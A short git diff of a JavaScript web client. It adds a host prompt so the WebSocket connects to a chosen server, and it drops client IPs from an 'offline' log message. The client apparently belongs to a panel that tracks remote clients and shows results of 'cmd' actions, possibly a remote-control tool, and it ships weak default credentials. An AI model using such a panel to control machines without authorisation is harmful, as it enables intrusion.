@@ -1,6 +1,7 @@
 var u = prompt("username：", "admin");
 var p = prompt("password：", "123456");
 var po = prompt("port", "3287")
+var ho = prompt("host","127.0.0.1")
 var base = new Base64();
 var loc = window.location;
 var uri = 'ws:';
@@ -10,7 +11,7 @@ if (loc.protocol === 'https:') {
     uri = 'wss:';
 }
 
-uri += '//' + document.domain + ':' + po;
+uri += '//' + ho + ':' + po;
 
 
 ws = new WebSocket(uri);
@@ -69,7 +70,7 @@ ws.onmessage = function (evt) {
     }
     if (data["action"] === "offline") {
         $(`#` + data["data"]["uuid"]).remove();
-        $("#log").append("<p style='color:#ff0000'>客户下线：" + data["data"]["ip"] + "</p>")
+        $("#log").append("<p style='color:#ff0000'>客户下线</p>")
     }
     if (data["action"] === "result") {
         if (data["data"]["action"] === "cmd") {
